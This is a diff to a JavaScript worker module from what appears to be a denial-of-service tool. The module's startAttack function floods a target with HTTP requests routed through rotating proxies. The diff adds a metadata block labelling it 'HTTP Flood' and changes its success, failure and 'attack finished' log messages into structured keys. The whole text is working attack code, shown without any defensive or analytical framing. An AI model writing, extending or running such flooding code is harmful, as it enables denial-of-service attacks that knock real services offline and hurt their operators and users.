@@ -3,6 +3,13 @@ import { parentPort, workerData } from "worker_threads";
 import { createMimicHttpClient } from "../utils/clientUtils.js";
 import { randomBoolean, randomString } from "../utils/randomUtils.js";
 
+export const info = {
+  id: "http_flood",
+  name: "HTTP Flood",
+  description: "Floods the target with HTTP requests.",
+  supportedProtocols: ["http", "https", "socks4", "socks5"],
+};
+
 const startAttack = () => {
   const { target, proxies, userAgents, duration, packetDelay, packetSize } =
     workerData;
@@ -25,12 +32,25 @@ const startAttack = () => {
 
       totalPackets++;
       parentPort.postMessage({
-        log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+        log: {
+          key: "request_success",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+          },
+        },
         totalPackets,
       });
     } catch (error) {
       parentPort.postMessage({
-        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
+        log: {
+          key: "request_failed",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+            error: error.message,
+          },
+        },
         totalPackets,
       });
     }
@@ -41,7 +61,7 @@ const startAttack = () => {
 
     if (elapsedTime >= duration) {
       clearInterval(interval);
-      parentPort.postMessage({ log: "Attack finished", totalPackets });
+      parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
       process.exit(0);
     }
 
